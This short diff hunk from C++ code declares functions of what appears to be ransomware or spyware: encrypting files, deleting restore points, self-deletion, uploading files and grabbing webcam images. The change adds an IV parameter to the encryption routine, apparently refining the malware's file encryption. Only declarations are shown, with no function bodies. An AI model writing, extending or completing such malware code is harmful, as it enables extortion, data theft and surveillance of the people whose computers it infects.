@@ -56,7 +56,7 @@ void ScheduleTask();
 std::vector<std::vector<std::string>> VectorSplitter(const std::vector<std::string>& baseVector, int parts);
 void DeleteRestorePoints();
 void DeleteMe(const std::string& myPath);
-void EncryptFiles(const std::vector<std::string>& files,const std::string& key);
+void EncryptFiles(const std::vector<std::string>& files,const std::string& key, const std::string& iv);
 void UploadFiles(const std::vector<std::string>& files);
 void TakeWebcams();
 void ChangeIcon();
